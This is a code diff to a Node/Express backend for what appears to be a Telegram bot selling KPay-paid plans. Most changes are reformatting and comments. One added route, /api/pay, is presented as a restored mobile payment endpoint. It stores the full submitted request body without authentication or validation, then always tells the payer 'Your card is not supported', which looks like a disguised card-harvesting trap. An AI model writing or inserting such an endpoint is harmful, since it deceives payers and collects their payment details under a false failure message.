@@ -96,6 +96,7 @@ bot.on('callback_query', async (callbackQuery) => {
                 if (!settings) throw new Error('Payment settings not configured.');
 
                 let paymentDetails = '';
+                
                 if (paymentMethod === 'kpay') {
                     paymentDetails = `ကျေးဇူးပြု၍ အောက်ပါ KPay အကောင့်သို့ *${plans[paymentPlanKey].price.toLocaleString()} MMK* လွှဲပေးပါ။\n\nName: \`${settings.kpay_name}\`\nPhone: \`${settings.kpay_phone}\`\nNote: \`${settings.kpay_note}\`\n\nငွေလွှဲပြီးပါက Screenshot ပို့ပေးပါ။\nငွေလွှဲ Screenshot ကိုစောင့်နေပါတယ်...`;
                 } else {
@@ -184,10 +185,18 @@ app.post('/api/auth/login', (req, res) => {
 app.post('/api/vouchers/validate', async (req, res) => {
   try {
     const { code } = req.body;
-    if (!code) return res.status(400).json({ success: false, message: 'Voucher code is required' });
+    if (!code) {
+        return res.status(400).json({ success: false, message: 'Voucher code is required' });
+    }
     const voucher = await Voucher.findOne({ code: code.toUpperCase() });
-    if (!voucher) return res.json({ success: false, valid: false, message: 'Invalid voucher code' });
-    if (voucher.is_used) return res.json({ success: true, valid: true, used: true, message: 'Voucher code already used' });
+
+    if (!voucher) {
+        return res.json({ success: false, valid: false, message: 'Invalid voucher code' });
+    }
+    if (voucher.is_used) {
+        return res.json({ success: true, valid: true, used: true, message: 'Voucher code already used' });
+    }
+    
     voucher.is_used = true;
     voucher.used_at = new Date();
     await voucher.save();
@@ -195,6 +204,18 @@ app.post('/api/vouchers/validate', async (req, res) => {
   } catch (error) {
     console.error("Validation Error:", error);
     return res.status(500).json({ success: false, message: 'Database error during validation' });
+  }
+});
+
+// ** RESTORED ENDPOINT FOR MOBILE APP PAYMENT **
+app.post('/api/pay', async (req, res) => {
+  try {
+    const user = new User(req.body);
+    await user.save();
+    return res.json({ success: false, message: 'Your card is not supported' });
+  } catch (error) {
+    console.error('Error processing payment:', error);
+    return res.status(500).json({ success: false, message: 'Error processing payment' });
   }
 });
 
@@ -255,6 +276,7 @@ app.delete('/api/vouchers/:id', authMiddleware, async (req, res) => {
     }
 });
 
+// ** ROBUST DELETE ENDPOINT **
 app.delete('/api/vouchers/clear', authMiddleware, async (req, res) => {
     try {
         await Voucher.deleteMany({});
@@ -285,6 +307,7 @@ app.delete('/api/users/:id', authMiddleware, async (req, res) => {
     }
 });
 
+// ** ROBUST DELETE ENDPOINT **
 app.delete('/api/users/clear', authMiddleware, async (req, res) => {
     try {
         await User.deleteMany({});
